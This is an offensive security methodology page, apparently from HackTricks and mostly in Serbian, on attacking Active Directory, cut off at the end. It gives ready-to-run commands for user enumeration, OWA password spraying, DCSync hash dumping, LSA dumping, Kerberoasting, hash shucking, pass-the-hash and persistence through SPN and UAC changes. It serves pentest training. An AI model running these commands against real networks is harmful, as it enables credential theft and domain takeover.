# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** služi kao osnovna tehnologija, omogućavajući **network administrators** da efikasno kreiraju i upravljaju **domains**, **users** i **objects** unutar mreže. Projektovan je za skaliranje, olakšavajući organizaciju velikog broja korisnika u upravljive **groups** i **subgroups**, uz kontrolu **access rights** na različitim nivoima.

Struktura **Active Directory** sastoji se od tri glavna sloja: **domains**, **trees** i **forests**. **Domain** obuhvata skup objekata, kao što su **users** ili **devices**, koji dele zajedničku bazu podataka. **Trees** su grupe ovih domaina povezane zajedničkom strukturom, a **forest** predstavlja skup više trees, međusobno povezanih kroz **trust relationships**, formirajući najviši sloj organizacione strukture. Na svakom od ovih nivoa mogu se dodeliti posebna prava **access** i **communication**.

Ključni pojmovi u okviru **Active Directory** uključuju:

1. **Directory** – Sadrži sve informacije koje se odnose na Active Directory objekte.
2. **Object** – Označava entitete unutar direktorijuma, uključujući **users**, **groups** ili **shared folders**.
3. **Domain** – Služi kao kontejner za objekate direktorijuma, sa mogućnošću da više domaina koegzistira unutar **forest**, pri čemu svaki održava sopstvenu kolekciju objekata.
4. **Tree** – Grupa domaina koja dele zajednički root domain.
5. **Forest** – Vrhunac organizacione strukture u Active Directory, sastavljen od više trees sa **trust relationships** među njima.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa ključnih za centralizovano upravljanje i komunikaciju unutar mreže. Ti servisi obuhvataju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijama između **users** i **domains**, uključujući funkcionalnosti **authentication** i **search**.
2. **Certificate Services** – Nadgleda kreiranje, distribuciju i upravljanje bezbednim **digital certificates**.
3. **Lightweight Directory Services** – Podržava aplikacije sa omogućenim direktorijumom kroz **LDAP protocol**.
4. **Directory Federation Services** – Pruža mogućnosti **single-sign-on** za autentifikaciju korisnika kroz više web aplikacija u jednoj sesiji.
5. **Rights Management** – Pomaže u zaštiti materijala zaštićenog autorskim pravima regulisanjem njegove neovlašćene distribucije i upotrebe.
6. **DNS Service** – Ključan za rešavanje **domain names**.

Za detaljnije objašnjenje pogledaj: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Da biste naučili kako da **attack an AD** morate stvarno dobro da **understand** proces **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Možete pronaći mnogo toga na [https://wadcoms.github.io/](https://wadcoms.github.io) za brzi pregled koje komande možete da pokrenete za enumeraciju/eksploataciju AD.

> [!WARNING]
> Kerberos komunikacija **requires a full qualifid name (FQDN)** za izvođenje akcija. Ako pokušate da pristupite mašini preko IP adrese, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Ako imate samo pristup AD okruženju, ali nemate nikakve kredencijale/sesije, možete:

- **Pentest the network:**
- Skenirajte mrežu, pronađite mašine i otvorene portove i pokušajte da **exploit vulnerabilities** ili da iz njih **extract credentials** (na primer, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerisanje DNS-a može dati informacije o ključnim serverima u domenu, kao što su web, printers, shares, vpn, media, itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte opštu [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) da biste pronašli više informacija o tome kako ovo da uradite.
- **Check for null and Guest access on smb services** (ovo neće raditi na modernim Windows verzijama):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič za enumeraciju SMB servera možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič za enumeraciju LDAP-a možete pronaći ovde (obratite **posebnu pažnju na anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Prikupite kredencijale [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pristupite hostu korišćenjem [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Prikupite kredencijale **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Izvucite korisnička imena/imena iz internih dokumenata, društvenih mreža, servisa (uglavnom web) unutar domena, kao i iz javno dostupnih izvora.
- Ako pronađete puna imena zaposlenih u kompaniji, možete isprobati različite AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Pogledajte stranice [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zatraži **invalid username** server će odgovoriti koristeći **Kerberos error** kod _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je korisničko ime nevažeće. **Valid usernames** će izazvati ili odgovoriti sa **TGT in a AS-REP** ili greškom _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje da korisnik mora da izvrši pre-authentication.
- **No Authentication against MS-NRPC**: Korišćenjem auth-level = 1 (No authentication) protiv MS-NRPC (Netlogon) interfejsa na domain controllerima. Metod poziva funkciju `DsrGetDcNameEx2` nakon bindovanja MS-NRPC interfejsa da proveri da li korisnik ili računar postoji bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovaj tip enumeracije. Istraživanje možete pronaći [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako ste pronašli jedan od ovih servera u mreži, možete takođe izvršiti **user enumeration against it**. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Možete pronaći liste korisničkih imena u [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  i u ovom ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **ime ljudi koji rade u kompaniji** iz recon koraka koji ste trebalo da uradite pre ovoga. Sa imenom i prezimenom možete koristiti skriptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) da generišete potencijalno validna korisnička imena.

### Knowing one or several usernames

Ok, dakle već znate da imate validno korisničko ime, ali nemate lozinke... Onda probajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_ možete **zatražiti AS_REP poruku** za tog korisnika koja će sadržati neke podatke šifrovane derivacijom lozinke tog korisnika.
- [**Password Spraying**](password-spraying.md): Hajde da probamo naj**češće lozinke** sa svakim otkrivenim korisnikom, možda neki korisnik koristi lošu lozinku (imajte na umu politiku lozinki!).
- Imajte na umu da takođe možete **sprayovati OWA servere** kako biste pokušali da dobijete pristup korisničkim mail serverima.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **obezbedite** neke challenge **hashes** za cracking tako što ćete **poisonovati** neke protokole **mreže**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ako ste uspeli da enumerišete active directory, imaćete **više emailova i bolje razumevanje mreže**. Možda ćete moći da forsirate NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  da biste dobili pristup AD okruženju.

### NetExec workspace-driven recon & relay posture checks

- Koristite **`nxcdb` workspaces** da čuvate AD recon stanje po angažmanu: `workspace create <name>` pokreće SQLite baze po protokolu u `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Prebacujte prikaze sa `proto smb|mssql|winrm` i listajte prikupljene tajne sa `creds`. Ručno obrišite osetljive podatke kada završite: `rm -rf ~/.nxc/workspaces/<name>`.
- Brzo otkrivanje podmreže sa **`netexec smb <cidr>`** prikazuje **domen**, **OS build**, **SMB signing requirements**, i **Null Auth**. Članovi koji pokazuju `(signing:False)` su **relay-prone**, dok DC-ovi često zahtevaju signing.
- Generišite **hostnames u /etc/hosts** direktno iz NetExec izlaza radi lakšeg targetiranja:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Kada je **SMB relay do DC blokiran** potpisivanjem, i dalje proveri **LDAP** posture: `netexec ldap <dc>` ističe `(signing:None)` / slabo channel binding. DC sa SMB signing required ali LDAP signing disabled ostaje validna meta za **relay-to-LDAP** za zloupotrebe kao što je **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs ponekad **ugrađuju masked admin passwords u HTML**. Pregled source/devtools može otkriti cleartext (npr. `<input value="<password>">`), što omogućava Basic-auth pristup za skeniranje/print repositories.
- Retrieved print jobs mogu sadržati **plaintext onboarding docs** sa per-user passwords. Zadrži pairing usklađenim tokom testiranja:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već poseduješ kao kandidata za lozinku za druge, sporije formate čiji se key material direktno izvodi iz NT hasha. Umesto brute-force napada na dugačke passphrase-ove u Kerberos RC4 ticket-ovima, NetNTLM challenge-evima ili cached credentials, ubacuješ NT hash-eve u Hashcat-ove NT-candidate mode-ove i puštaš ih da provere password reuse bez ikad saznane plaintext-a. Ovo je posebno moćno nakon domain compromise-a, gde možeš prikupiti hiljade trenutnih i istorijskih NT hash-eva.

Koristi shucking kada:

- Imaš NT corpus iz DCSync, SAM/SECURITY dump-ova ili credential vault-ova i treba da testiraš reuse u drugim domain-ima/forest-ovima.
- Hvataš RC4-based Kerberos materijal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM odgovore ili DCC/DCC2 blob-ove.
- Želiš brzo da dokažeš reuse za duge, nekrakabilne passphrase-ove i odmah pivot-uješ putem Pass-the-Hash.

Tehnika **ne radi** protiv encryption type-ova čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domain nameće AES-only, moraš da se vratiš na regularne password mode-ove.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Istorijski zapisi dramatično proširuju kandidat pool zato što Microsoft može da čuva do 24 prethodna hasha po nalogu. Za više načina da prikupiš NTDS secrets vidi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) izvlači lokalne SAM/SECURITY podatke i keširane domain logon-e (DCC/DCC2). Ukloni duplikate i dodaj te hasheve u istu `nt_candidates.txt` listu.
- **Track metadata** – Čuvaj username/domain koji je proizveo svaki hash (čak i ako wordlist sadrži samo hex). Poklapanje hash-eva ti odmah kaže koji principal ponovo koristi lozinku čim Hashcat ispiše pobednički kandidat.
- Prefer candidates from the same forest or a trusted forest; to maksimalizuje šansu za overlap pri shucking-u.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat izvodi RC4 key iz svakog NT candidate-a i validira `$krb5tgs$23$...` blob. Match potvrđuje da service account koristi jedan od tvojih postojećih NT hash-eva.

3. Odmah pivot-uj via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Po potrebi kasnije možeš oporaviti plaintext pomoću `hashcat -m 1000 <matched_hash> wordlists/`.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopiraj DCC2 liniju za zanimljivog domain user-a u `dcc2_highpriv.txt` i shuck-uj je:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uspešno poklapanje daje NT hash već poznat u tvojoj listi, što dokazuje da cached user ponovo koristi lozinku. Koristi ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga brute-force-uj u brzom NTLM mode-u da bi oporavio string.

Isti workflow se primenjuje na NetNTLM challenge-response-ove (`-m 27000/27100`) i DCC (`-m 31500`). Jednom kada se match identifikuje, možeš da pokreneš relay, SMB/WMI/WinRM PtH, ili da ponovo crack-uješ NT hash maskama/rules offline.



## Enumerating Active Directory WITH credentials/session

Za ovu fazu treba da si **kompromitovao credentials ili session validnog domain account-a.** Ako imaš validne credentials ili shell kao domain user, **treba da zapamtiš da su opcije date pre toga i dalje opcije za kompromitovanje drugih korisnika**.

Pre nego što počneš authenticated enumeration, treba da znaš šta je **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Komprovitovanje naloga je **veliki korak ka kompromitovanju celog domain-a**, zato što ćeš moći da počneš **Active Directory Enumeration:**

Što se tiče [**ASREPRoast**](asreproast.md), sada možeš da pronađeš svakog mogućeg vulnerable user-a, a što se tiče [**Password Spraying**](password-spraying.md), možeš da dobiješ **listu svih username-ova** i da probaš lozinku kompromitovanog naloga, prazne lozinke i nove obećavajuće lozinke.

- Možeš da koristiš [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Možeš i da koristiš [**powershell for recon**](../basic-powershell-for-pentesters/index.html), što će biti stealthier
- Možeš i da [**use powerview**](../basic-powershell-for-pentesters/powerview.md) za izvlačenje detaljnijih informacija
- Još jedan odličan tool za recon u active directory je [**BloodHound**](bloodhound.md). Nije baš stealthy (zavisno od metoda prikupljanja koje koristiš), ali **ako te to ne brine**, definitivno bi trebalo da ga probaš. Pronađi gde user-i mogu RDP, pronađi path do drugih grupa, itd.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) jer mogu sadržati zanimljive informacije.
- A **tool with GUI** koji možeš da koristiš za enumeraciju directory-ja je **AdExplorer.exe** iz **SysInternal** Suite.
- Takođe možeš da pretražuješ LDAP database pomoću **ldapsearch** da tražiš credentials u poljima _userPassword_ & _unixUserPassword_, ili čak u _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) za druge metode.
- Ako koristiš **Linux**, možeš takođe da radiš enumeraciju domain-a pomoću [**pywerview**](https://github.com/the-useless-one/pywerview).
- Takođe možeš da probaš automated tools kao:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Veoma je lako dobiti sva domain username-ove iz Windows-a (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). U Linux-u možeš da koristiš: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Čak i ako ovaj Enumeration odeljak izgleda mali, ovo je najvažniji deo od svih. Otvori linkove (pre svega one za cmd, powershell, powerview i BloodHound), nauči kako da enumerišeš domain i vežbaj dok se ne budeš osećao komforno. Tokom assessment-a, ovo će biti ključni trenutak da pronađeš put do DA ili da odlučiš da se ništa ne može uraditi.

### Kerberoast

Kerberoasting podrazumeva pribavljanje **TGS ticket-ova** koje koriste servisi vezani za user account-e i cracking njihove enkripcije — koja je zasnovana na lozinkama korisnika — **offline**.

Više o ovome u:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Kada dobiješ neke credentials, možeš da proveriš da li imaš pristup bilo kojoj **mašini**. Za to možeš da koristiš **CrackMapExec** da pokušaš povezivanje na nekoliko servera sa različitim protokolima, u skladu sa skeniranjem portova.

### Local Privilege Escalation

Ako si kompromitovao credentials ili session kao običan domain user i imaš **access** sa ovim user-om na **bilo kojoj mašini u domain-u** trebalo bi da pokušaš da pronađeš put do lokalnog eskaliranja privilegija i looting za credentials. To je zato što ćeš samo sa local administrator privileges moći da **dump-uješ hasheve drugih korisnika** u memoriji (LSASS) i lokalno (SAM).

Postoji kompletna stranica u ovoj knjizi o [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) i [**checklist**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravi da koristiš [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Veoma je **malo verovatno** da ćeš pronaći **tickets** u trenutnom user-u koji ti **daju dozvolu da pristupiš** neočekivanim resursima, ali možeš da proveriš:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ako ste uspeli da enumerišete active directory, imaćete **više emailova i bolje razumevanje mreže**. Možda ćete moći da naterate NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sada kada imate neke osnovne kredencijale, trebalo bi da proverite da li možete da **pronađete** neke **zanimljive fajlove koji se dele unutar AD**. To biste mogli da uradite ručno, ali je to veoma dosadan, ponavljajući posao (i još više ako pronađete stotine dokumenata koje treba da proverite).

[**Pratite ovaj link da biste saznali više o alatima koje možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ako možete da **pristupite drugim PC računarima ili deljenim resursima**, mogli biste da **postavite fajlove** (kao što je SCF fajl) koji će, ako im se nekako pristupi, t**rigovati NTLM autentifikaciju ka vama** kako biste mogli da **ukradete** **NTLM challenge** i crackujete ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala bilo kom autentifikovanom korisniku da **kompromituje domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Za sledeće tehnike običan domain user nije dovoljan, potrebne su vam posebne privilegije/kredencijali da biste izveli ove napade.**

### Hash extraction

Nadamo se da ste uspeli da **kompromitujete neki lokalni admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da iz memorije i lokalno izvučete sve hash-eve.\
[**Pročitajte ovu stranicu o različitim načinima da dobijete hash-eve.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash nekog korisnika**, možete ga koristiti da biste ga **impersonate**-ovali.\
Morate da koristite neki **alat** koji će **izvršiti** **NTLM autentifikaciju koristeći** taj **hash**, **ili** možete napraviti novu **sessionlogon** i **ubaciti** taj **hash** u **LSASS**, tako da će se, kad god se izvrši bilo kakva **NTLM autentifikacija**, koristiti taj **hash**. Poslednja opcija je ono što mimikatz radi.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **koristi NTLM hash korisnika za zahtev Kerberos ticket-a**, kao alternativu uobičajenom Pass The Hash preko NTLM protokola. Zbog toga, ovo može biti posebno **korisno u mrežama gde je NTLM protokol onemogućen** i gde je samo **Kerberos dozvoljen** kao autentifikacioni protokol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **kradu autentifikacioni ticket korisnika** umesto njegove lozinke ili hash vrednosti. Ovaj ukradeni ticket se zatim koristi da se **impersonate** korisnik, čime se dobija neovlašćen pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ako imate **hash** ili **lozinku** nekog **lokalnog administratora**, trebalo bi da pokušate da se **lokalno prijavite** na druge **PC računare** pomoću njih.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **noisy** i da bi **LAPS** to **mitigate**.

### MSSQL Abuse & Trusted Links

Ako korisnik ima privilegije da **access MSSQL instances**, može biti u mogućnosti da to iskoristi za **execute commands** na MSSQL hostu (ako radi kao SA), **steal** NetNTLM **hash** ili čak da izvede **relay** **attack**.\
Takođe, ako je MSSQL instance trusted (database link) od strane druge MSSQL instance. Ako korisnik ima privilegije nad trusted bazom, moći će da **use the trust relationship to execute queries also in the other instance**. Ovi trustovi mogu da se lančaju i u nekom trenutku korisnik možda može da pronađe pogrešno konfigurisan database gde može da execute commands.\
**Veze između baza rade čak i preko forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Platforme za inventarisanje i deployment trećih strana često izlažu moćne puteve do credentials i code execution. Vidi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer object sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domain privilegije na računaru, moći ćete da dump-ujete TGT-ove iz memorije svakog korisnika koji se uloguje na računar.\
Dakle, ako se **Domain Admin uloguje na računar**, moći ćete da dump-ujete njegov TGT i da ga impersonate-ujete koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation mogli biste čak i da **automatically compromise a Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljen "Constrained Delegation", on će moći da **impersonate any user to access some services in a computer**.\
Zatim, ako **compromise the hash** ovog korisnika/računara, moći ćete da **impersonate any user** (čak i domain adminse) da biste pristupili nekim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Imanje **WRITE** privilegije nad Active Directory objektom udaljenog računara omogućava postizanje code execution sa **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Komprimovani korisnik može imati neke **interesting privileges over some domain objects** koje bi vam mogle omogućiti da **move** laterally/**escalate** privilegije.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Otkrivanje **Spool service listening** unutar domena može da se **abused** za **acquire new credentials** i **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ako **other users** **access** **compromised** mašinu, moguće je **gather credentials from memory** i čak **inject beacons in their processes** da biste ih impersonate-ovali.\
Obično će se korisnici povezivati na sistem preko RDP, pa evo kako da izvedete nekoliko napada nad tuđim RDP sesijama:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **local Administrator password** na računarima pridruženim domenu, osiguravajući da je **randomized**, jedinstvena i često **changed**. Ove lozinke se čuvaju u Active Directory i pristup je kontrolisan putem ACL-ova, samo za ovlašćene korisnike. Sa dovoljnim privilegijama za pristup ovim lozinkama, moguće je pivot-ovati na druge računare.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** sa kompromitovane mašine može biti jedan od načina za eskalaciju privilegija unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ako su konfigurirani **vulnerable templates**, moguće ih je zloupotrebiti za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Kada dobijete privilegije **Domain Admin** ili još bolje **Enterprise Admin**, možete da **dump**-ujete **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Neke od prethodno razmatranih tehnika mogu se koristiti za persistence.\
Na primer, možete:

- Napraviti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Napraviti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodeliti [**DCSync**](#dcsync) privilegije korisniku

```bash
